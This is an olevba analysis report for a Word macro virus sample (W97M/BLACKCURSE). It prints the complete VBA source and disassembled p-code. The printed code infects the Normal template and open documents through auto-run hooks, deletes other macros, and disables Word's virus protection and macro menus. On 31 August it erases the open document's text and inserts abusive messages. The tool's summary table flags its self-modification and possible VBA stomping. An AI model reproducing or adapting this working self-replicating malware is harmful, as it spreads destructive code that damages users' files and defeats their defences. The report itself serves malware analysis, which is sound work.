olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bleck
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bleck - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BLACKCURSE.bas 
in file: ./Virus.MSWord.Bleck - OLE stream: 'Macros/VBA/BLACKCURSE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub BLACKCURSE()
    ' W97M/BLACKCURSE
    ' BY BLACKROSE OF CAMARINES SUR
    ' BLACKROSE IS ALSO KNOWN AS ULTRAVIOLET,
    ' SKYFIRE AND BLACKVIRGOCODER
    On Error Resume Next
    Dim NormlTemp, ActivDoc As Boolean, Cntr As Double, WhereWeAre As Object
    Call AboutTheAuthor
    Set BlackNormalObj = NormalTemplate.VBProject.VBComponents
    Set BlackActiveObj = ActiveDocument.VBProject.VBComponents
    For Cntr = 1 To BlackNormalObj.Count
        MName = BlackNormalObj.Item(Cntr).Name
            If MName = "BLACKCURSE" Then
                NormlTemp = True
                Set WhereWeAre = BlackNormalObj.Item("BLACKCURSE").Codemodule
            End If
            If (MName <> "BLACKCURSE") And (MName <> "ThisDocument") Then
                BlackNormalObj.Item(Cntr).Codemodule.Deletelines 1, BlackNormalObj.Item(Cntr).Codemodule.CountOfLines
            End If
    Next Cntr
    For Each Baby In Dïcuments
        ActivDoc = False
        Set BlackActiveObj = Baby.VBProject.VBComponents
        For Cntr = 1 To BlackActiveObj.Count
            MName = BlackActiveObj.Item(Cntr).Name
                If MName = "BLACKCURSE" Then
                    ActivDoc = True
                    Set WhereWeAre = BlackActiveObj.Item("BLACKCURSE").Codemodule
                End If
                If (MName <> "BLACKCURSE") And (MName <> "ThisDocument") Then
                    BlackActiveObj.Item(Cntr).Codemodule.Deletelines 1, BlackNormalObj.Item(Cntr).Codemodule.CountOfLines
                End If
        Next Cntr
        If NormlTemp And Not ActivDoc Then
            Spread BD:=BlackActiveObj.Add(1), BS:=WhereWeAre
               If InStr(1, ActiveDocument.Name, "Document", 1) = 0 Then
                   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=0
               End If
        End If
    Next Baby
    If Not NormlTemp Then
            Stealth
            Spread BD:=BlackNormalObj.Add(1), BS:=WhereWeAre
            NormalTemplate.Save
    End If
End Sub
Function Spread(BD As Object, BS As Object)
    On Error Resume Next
        Cntr = 1
        BD.Name = "BLACKCURSE"
        Do While BS.Lines(Cntr, 1) <> ""
            BD.Codemodule.Insertlines Cntr, BS.Lines(Cntr, 1)
            Cntr = Cntr + 1
        Loop
End Function
Sub Stealth()
    On Error Resume Next
        CustomizationContext = NormalTemplate
        CommandBars("Tools").Controls("Macro").Enabled = False
        CommandBars("Tools").Controls("Options").Enabled = False
        CommandBars("Visual Basic").Enabled = False
        CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
        CommandBars("Visual Basic").Protection = msoBarNoCustomize
        FindKey(BuildKeyCode(122, 1024)).Disable
        FindKey(BuildKeyCode(119, 1024)).Disable
        CommandBars("Visual Basic").Visible = False
End Sub
Sub AboutTheAuthor()
    On Error Resume Next
        With Dialogs(86)
          .Title = "BLACKCURSE"
          .Author = "BLACKROSE"
          .Execute
        End With
End Sub
Sub ActivateBLACKCURSE()
    On Error Resume Next
        Mensahe = """HIJADIPUTA KANG HAYUP KA!" & vbCrLf & _
                  "BURAY MO, SAKA BURAY NI INA MO! HAYUP KA!" & vbCrLf & _
                  "SAYANG KA, HAYUP KA!" & vbCrLf & _
                  "HAYUP KA TALAGA!"""
        If Dïcuments.Count = 0 Then
            Dïcuments.Add
        Else
            Selection.WholeStory
            Selection.Delete Unit:=1, Count:=1
        End If
        If ActiveWindow.View.SplitSpecial = wdPaneNone Then
            ActiveWindow.ActivePane.View.Type = wdPageView
        Else
            ActiveWindow.View.Type = wdPageView
        End If
        Application.Caption = "Birthday ko " & Date
        With Options
            .CheckGrammarAsYouType = False
            .CheckSpellingAsYouType = False
            .BlueScreen = False
        End With
        With Selection
            .Font.Name = "Copperplate Gothic Light"
            .Font.Size = 20
            .Font.ColorIndex = wdAuto
            .ParagraphFormat.Alignment = 1
            .TypeText Text:="A CURSE FROM BLACKROSE TO SOMEONE HE HATES"
            .Font.Size = 14
            .TypeParagraph
            .TypeParagraph
            .TypeText Text:=Mensahe
            .TypeParagraph
            .TypeParagraph
            .Font.Size = 20
            .TypeText Text:="WORD97/BLACKCURSE" & Chr(10)
            .Font.Bold = False
            .Font.Size = 12
            .TypeText Text:="VIRGOBLACKROSE Virus Development" & vbCrLf & "Libmanan Camarines Sur"
        End With
        If InStr(1, ActiveDocument.Name, "Document", 1) = 0 Then ActiveDocument.Save
End Sub
Sub AutoOpen()
    On Error Resume Next
        BLACKCURSE
        ShowVisualBasicEditor = False
        Application.EnableCancelKey = 0
        With Options
            .SaveNormalPrompt = False
            .SaveInterval = 10
            .VirusProtection = False
        End With
        If (Month(Now) = 8 And Day(Now) = 31) Then ActivateBLACKCURSE
End Sub
Sub AutoClose()
    On Error Resume Next
        BLACKCURSE
End Sub
Sub AutoExec()
    On Error Resume Next
        AutoOpen
End Sub
Sub filesave()
    On Error Resume Next
        BLACKCURSE
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
        BLACKCURSE
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileNew()
    On Error Resume Next
        Dialogs(wdDialogFileNew).Show
        AutoOpen
End Sub
Sub viewvbcode()
    On Error Resume Next
        Application.Quit
End Sub
p
I
Min
aAM

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bleck
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/BLACKCURSE - 8908 bytes
' Line #0:
' 	FuncDefn (Sub BLACKCURSE())
' Line #1:
' 	QuoteRem 0x0004 0x0010 " W97M/BLACKCURSE"
' Line #2:
' 	QuoteRem 0x0004 0x001E " BY BLACKROSE OF CAMARINES SUR"
' Line #3:
' 	QuoteRem 0x0004 0x0028 " BLACKROSE IS ALSO KNOWN AS ULTRAVIOLET,"
' Line #4:
' 	QuoteRem 0x0004 0x001C " SKYFIRE AND BLACKVIRGOCODER"
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Dim 
' 	VarDefn NormlTemp
' 	VarDefn ActivDoc (As Boolean)
' 	VarDefn Cntr (As Double)
' 	VarDefn WhereWeAre (As Object)
' Line #7:
' 	ArgsCall (Call) AboutTheAuthor 0x0000 
' Line #8:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set BlackNormalObj 
' Line #9:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set BlackActiveObj 
' Line #10:
' 	StartForVariable 
' 	Ld Cntr 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld BlackNormalObj 
' 	MemLd Count 
' 	For 
' Line #11:
' 	Ld Cntr 
' 	Ld BlackNormalObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St MName 
' Line #12:
' 	Ld MName 
' 	LitStr 0x000A "BLACKCURSE"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitVarSpecial (True)
' 	St NormlTemp 
' Line #14:
' 	SetStmt 
' 	LitStr 0x000A "BLACKCURSE"
' 	Ld BlackNormalObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	Set WhereWeAre 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld MName 
' 	LitStr 0x000A "BLACKCURSE"
' 	Ne 
' 	Paren 
' 	Ld MName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld Cntr 
' 	Ld BlackNormalObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld Cntr 
' 	Ld BlackNormalObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld Cntr 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	StartForVariable 
' 	Ld Baby 
' 	EndForVariable 
' 	Ld Dïcuments 
' 	ForEach 
' Line #21:
' 	LitVarSpecial (False)
' 	St ActivDoc 
' Line #22:
' 	SetStmt 
' 	Ld Baby 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set BlackActiveObj 
' Line #23:
' 	StartForVariable 
' 	Ld Cntr 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld BlackActiveObj 
' 	MemLd Count 
' 	For 
' Line #24:
' 	Ld Cntr 
' 	Ld BlackActiveObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St MName 
' Line #25:
' 	Ld MName 
' 	LitStr 0x000A "BLACKCURSE"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitVarSpecial (True)
' 	St ActivDoc 
' Line #27:
' 	SetStmt 
' 	LitStr 0x000A "BLACKCURSE"
' 	Ld BlackActiveObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	Set WhereWeAre 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld MName 
' 	LitStr 0x000A "BLACKCURSE"
' 	Ne 
' 	Paren 
' 	Ld MName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld Cntr 
' 	Ld BlackNormalObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	Ld Cntr 
' 	Ld BlackActiveObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld Cntr 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld NormlTemp 
' 	Ld ActivDoc 
' 	Not 
' 	And 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld BlackActiveObj 
' 	ArgsMemLd Add 0x0001 
' 	ParamNamed BD 
' 	Ld WhereWeAre 
' 	ParamNamed BS 
' 	ArgsCall Spread 0x0002 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitDI2 0x0000 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld Baby 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Ld NormlTemp 
' 	Not 
' 	IfBlock 
' Line #41:
' 	ArgsCall Stealth 0x0000 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld BlackNormalObj 
' 	ArgsMemLd Add 0x0001 
' 	ParamNamed BD 
' 	Ld WhereWeAre 
' 	ParamNamed BS 
' 	ArgsCall Spread 0x0002 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Function Spread(BD As Object, BS As Object))
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitDI2 0x0001 
' 	St Cntr 
' Line #49:
' 	LitStr 0x000A "BLACKCURSE"
' 	Ld BD 
' 	MemSt New 
' Line #50:
' 	Ld Cntr 
' 	LitDI2 0x0001 
' 	Ld BS 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #51:
' 	Ld Cntr 
' 	Ld Cntr 
' 	LitDI2 0x0001 
' 	Ld BS 
' 	ArgsMemLd Lines 0x0002 
' 	Ld BD 
' 	MemLd Codemodule 
' 	ArgsMemCall Insertlines 0x0002 
' Line #52:
' 	Ld Cntr 
' 	LitDI2 0x0001 
' 	Add 
' 	St Cntr 
' Line #53:
' 	Loop 
' Line #54:
' 	EndFunc 
' Line #55:
' 	FuncDefn (Sub Stealth())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #58:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #59:
' 	LitVarSpecial (False)
' 	LitStr 0x0007 "Options"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #60:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #61:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #62:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #63:
' 	LitDI2 0x007A 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #64:
' 	LitDI2 0x0077 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #65:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub AboutTheAuthor())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	StartWithExpr 
' 	LitDI2 0x0056 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #70:
' 	LitStr 0x000A "BLACKCURSE"
' 	MemStWith Title 
' Line #71:
' 	LitStr 0x0009 "BLACKROSE"
' 	MemStWith Author 
' Line #72:
' 	ArgsMemCallWith Execute 0x0000 
' Line #73:
' 	EndWith 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub ActivateBLACKCURSE())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LineCont 0x000C 06 00 12 00 0A 00 12 00 0E 00 12 00
' 	LitStr 0x001A ""HIJADIPUTA KANG HAYUP KA!"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0029 "BURAY MO, SAKA BURAY NI INA MO! HAYUP KA!"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0014 "SAYANG KA, HAYUP KA!"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0011 "HAYUP KA TALAGA!""
' 	Concat 
' 	St Mensahe 
' Line #78:
' 	Ld Dïcuments 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld Dïcuments 
' 	ArgsMemCall Add 0x0000 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #82:
' 	LitDI2 0x0001 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemLd SplitSpecial 
' 	Ld wdPaneNone 
' 	Eq 
' 	IfBlock 
' Line #85:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	LitStr 0x000C "Birthday ko "
' 	Ld Date 
' 	Concat 
' 	Ld Application 
' 	MemSt Caption 
' Line #90:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith BlueScreen 
' Line #94:
' 	EndWith 
' Line #95:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #96:
' 	LitStr 0x0018 "Copperplate Gothic Light"
' 	MemLdWith Font 
' 	MemSt New 
' Line #97:
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #98:
' 	Ld wdAuto 
' 	MemLdWith Font 
' 	MemSt ColorIndex 
' Line #99:
' 	LitDI2 0x0001 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #100:
' 	LitStr 0x002A "A CURSE FROM BLACKROSE TO SOMEONE HE HATES"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #101:
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #102:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #103:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #104:
' 	Ld Mensahe 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #105:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #106:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #107:
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #108:
' 	LitStr 0x0011 "WORD97/BLACKCURSE"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #109:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #110:
' 	LitDI2 0x000C 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #111:
' 	LitStr 0x0020 "VIRGOBLACKROSE Virus Development"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0016 "Libmanan Camarines Sur"
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #112:
' 	EndWith 
' Line #113:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub AutoOpen())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall BLACKCURSE 0x0000 
' Line #118:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #119:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #120:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #121:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #122:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #123:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #124:
' 	EndWith 
' Line #125:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ActivateBLACKCURSE 0x0000 
' 	EndIf 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub AutoClose())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall BLACKCURSE 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoExec())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall AutoOpen 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub filesave())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall BLACKCURSE 0x0000 
' Line #138:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub fileclose())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall BLACKCURSE 0x0000 
' Line #143:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #144:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub FileNew())
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	ArgsCall AutoOpen 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub viewvbcode())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	ArgsCall p 0x0000 
' Line #156:
' 	ArgsCall I 0x0000 
' Line #157:
' 	ArgsCall Min 0x0000 
' Line #158:
' 	ArgsCall aAM 0x0000 
' Line #159:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

